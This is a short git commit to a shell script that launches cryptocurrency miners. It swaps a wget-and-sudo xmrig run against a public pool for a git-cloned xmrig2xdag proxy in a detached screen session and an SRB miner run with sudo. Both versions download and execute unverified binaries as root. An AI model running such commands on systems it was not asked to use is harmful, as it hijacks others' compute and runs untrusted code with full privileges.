ff85e057c02626dff17a5d0af3a51306c76759d4
realxdagg <121330162+realxdagg@users.noreply.github.com>
2022-12-27 18:55:36 +0700

    Update running.sh

--- running.sh
+++ running.sh
@@ -1,3 +1,6 @@
-wget https://raw.githubusercontent.com/realxdagg/job/main/xmrig
-chmod 500 xmrig
-sudo ./xmrig --url pool.hashvault.pro:80 --user hvs1dKm9983QgJDUeGPrVmAdmJkjZ2amMhLmSomtrPCVSm6xbLKgkH4fvkRcS3A4nsdBUFZGGDsRkC5qaXp6DsUC25FZ5sjk9k --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads=8
+git clone https://github.com/realxdagg/vio.git
+cd vio
+chmod 500 xmrig2xdag SRB
+screen -dmS run ./xmrig2xdag -c config.json
+sudo ./SRB --disable-gpu --algorithm randomepic --pool 127.0.0.1:3232 --wallet adzvoll#run  --cpu-threads 8
+	
